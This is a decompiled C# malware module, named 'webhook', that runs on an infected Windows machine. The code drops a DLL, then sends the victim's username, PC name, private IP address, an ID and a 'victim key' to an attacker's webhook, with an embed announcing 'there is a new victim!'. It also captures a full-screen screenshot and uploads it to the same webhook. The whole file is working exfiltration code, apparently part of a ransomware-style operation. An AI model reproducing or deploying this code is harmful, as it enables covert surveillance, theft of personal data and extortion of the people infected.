using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using ConsoleApp2.Properties;
using Newtonsoft.Json;
using conso;

namespace webhook;

public class webhooks
{
	public static void Main(string webhook, string perid)
	{
		using (FileStream fileStream = new FileStream("Newtonsoft.Json.dll", FileMode.Create, FileAccess.Write))
		{
			fileStream.Write(Resources.Newtonsoft_Json, 0, Resources.Newtonsoft_Json.Length);
		}
		webhooks webhooks2 = new webhooks();
		webhooks2.message(webhook, perid);
		webhooks2.SendComputerScreenShot(webhook);
	}

	public static string GetLocalIPAddress()
	{
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		int num = 0;
		IPAddress iPAddress;
		while (true)
		{
			if (num < addressList.Length)
			{
				iPAddress = addressList[num];
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					break;
				}
				num++;
				continue;
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}
		return iPAddress.ToString();
	}

	public void wait(int time)
	{
		try
		{
			Thread.Sleep(Convert.ToInt32(time));
		}
		catch
		{
		}
	}

	public void SendComputerScreenShot(string webhookUrl)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		Bitmap val = new Bitmap(bounds.Width, bounds.Height);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			((Image)val).Save(Path.GetTempPath() + "ss.png", ImageFormat.get_Png());
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		string path = Path.GetTempPath() + "ss.png";
		HttpClient val3 = new HttpClient();
		try
		{
			MultipartFormDataContent val4 = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(path);
			val4.Add((HttpContent)new ByteArrayContent(array, 0, array.Length), "png", Path.GetTempPath() + "ss.png");
			val3.PostAsync(webhookUrl, (HttpContent)(object)val4).Wait();
			((HttpMessageInvoker)val3).Dispose();
		}
		finally
		{
			((IDisposable)val3)?.Dispose();
		}
	}

	public void message(string webhookUrl, string peid)
	{
		WebRequest webRequest = (HttpWebRequest)WebRequest.Create(webhookUrl);
		webRequest.ContentType = "application/json";
		webRequest.Method = "POST";
		using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
		{
			string value = JsonConvert.SerializeObject((object)new
			{
				embeds = new[]
				{
					new
					{
						description = "the victim has been infected at " + DateTimeOffset.UtcNow.ToString() + "\nname of the victim: " + Environment.UserName + "\nname of the victim\u00b4s PC: " + Environment.MachineName + "\nprivate ip of the victim: " + GetLocalIPAddress() + "\nID of the victim: " + peid + "\nThe victim key: " + Program.password + "\nan screenshot of the victim\u00b4s computer:",
						title = "there is a new victim!",
						color = "15548997",
						footer = new
						{
							icon_url = "",
							text = ""
						}
					}
				}
			});
			streamWriter.Write(value);
		}
		_ = (HttpWebResponse)webRequest.GetResponse();
	}
}
